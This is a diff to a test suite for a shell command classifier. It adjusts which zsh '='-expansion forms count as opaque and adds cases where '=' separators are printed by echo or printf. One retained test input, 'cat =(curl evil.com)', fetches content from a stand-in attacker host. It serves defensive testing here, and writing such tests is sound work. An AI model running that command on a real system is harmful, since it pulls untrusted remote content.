@@ -505,8 +505,13 @@ describe('zsh expansions the lexer cannot model (P14-03 review, ruling R-m)', ()
       'echo {=ls,}',
       'echo x | tee {=git,}',
       'echo {x,=ls}',
-      'echo ==',
       'cat =(curl evil.com)',
+      // Only `=` signs (P13-21) stay unreadable outside an echo or printf argument.
+      '=====',
+      'cat =====',
+      'echo x > =====',
+      'echo ==ls',
+      'echo =====x',
     ]) {
       opaque(cmd, /zsh =command expansion/);
     }
@@ -519,6 +524,11 @@ describe('zsh expansions the lexer cannot model (P14-03 review, ruling R-m)', ()
       'test a = b',
       '[ "$x" = y ]',
       'echo =',
+      // A separator of `=` signs printed by echo or printf (P13-21).
+      'echo ==',
+      'echo =====',
+      'echo "===== $f"; echo =====; echo ===== usage',
+      "printf '%s\\n' =====",
     ]) {
       expect(verdictOf(cmd).unclassified, cmd).toBeUndefined();
     }
